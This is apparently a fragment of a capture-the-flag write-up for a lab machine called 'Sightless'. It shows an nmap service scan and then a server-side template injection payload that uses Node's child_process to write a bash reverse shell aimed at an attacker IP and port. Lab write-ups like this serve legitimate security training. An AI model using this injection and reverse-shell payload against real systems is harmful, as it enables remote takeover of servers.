## Sightless

```
[★]$ nmap -sC -sV 10.129.231.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-03 02:44 CDT
Nmap scan report for sightless.htb (10.129.231.103)
Host is up (0.010s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.231.103]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Sightless.htb
```

```
{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.71/4455 0>&1" > /tmp/exploit.sh') }}
```
